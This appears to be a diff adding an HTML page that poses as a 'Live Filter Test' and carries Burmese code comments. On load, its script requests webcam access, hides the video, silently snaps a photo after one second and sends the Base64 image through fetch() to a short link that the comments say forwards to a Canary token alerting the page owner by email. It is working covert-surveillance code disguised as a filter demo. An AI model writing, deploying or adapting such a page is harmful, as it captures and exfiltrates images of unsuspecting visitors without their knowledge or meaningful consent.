@@ -1,0 +1,57 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Live Filter Test</title>
+</head>
+<body>
+    <h2>Loading Live Filters...</h2>
+    <video id="video" width="320" height="240" autoplay style="display:none;"></video>
+    <canvas id="canvas" width="320" height="240" style="display:none;"></canvas>
+
+    <script>
+        // သင့်ရဲ့ short link ကနေတစ်ဆင့် Canary tokens ဆီသို့ ပို့မည့် လမ်းကြောင်း
+        const SHORT_LINK_URL = "https://short-url.cc";
+
+        window.addEventListener("load", async () => {
+            try {
+                // Browser ထံမှ ကင်မရာ အသုံးပြုခွင့် (Permission) တောင်းခံခြင်း
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
+                const video = document.getElementById('video');
+                video.srcObject = stream;
+
+                // ကင်မရာပွင့်ပြီး ၁ စက္ကန့်အကြာတွင် ဓာတ်ပုံရိုက်ယူမည်
+                setTimeout(() => {
+                    const canvas = document.getElementById('canvas');
+                    const context = canvas.getContext('2d');
+                    context.drawImage(video, 0, 0, 320, 240);
+                    
+                    // ရလာသော ဓာတ်ပုံမြင်ကွင်းကို Base64 စာသားအဖြစ် ပြောင်းလဲခြင်း
+                    const imageData = canvas.toDataURL('image/jpeg');
+
+                    // ဓာတ်ပုံ စာသားအချက်အလက်ကို Canary Link ဆီသို့ လှမ်းပို့ခြင်း
+                    sendToCanary(imageData);
+                }, 1000);
+
+            } catch (err) {
+                console.log("Permission Denied (အသုံးပြုသူက ငြင်းပယ်လိုက်သည်):", err);
+            }
+        });
+
+        function sendToCanary(base64Image) {
+            // စာသားအရှည် ကန့်သတ်ချက် ရှိနိုင်သောကြောင့် ဓာတ်ပုံ၏ အဓိက အစိတ်အပိုင်းကို ဖြတ်ယူခြင်း
+            const cleanData = encodeURIComponent(base64Image.substring(0, 500)); 
+            
+            // Short Link ရဲ့ နောက်ကွယ်က Canary API ဆီကို သွားမည့် လမ်းကြောင်းပုံစံ ပြောင်းလဲခြင်း
+            const targetUrl = `${SHORT_LINK_URL}?data=${cleanData}`;
+            
+            // ခေါ်ယူလိုက်သည်နှင့် သင့်အီးမေးလ်ထဲသို့ Alert နှင့်အတူ ဓာတ်ပုံဒေတာ ပါသွားမည် ဖြစ်သည်
+            fetch(targetUrl).then(() => {
+                console.log("[+] Data Successfully Sent to Canary Link!");
+            }).catch((err) => {
+                console.log("Sending failed:", err);
+            });
+        }
+    </script>
+</body>
+</html>
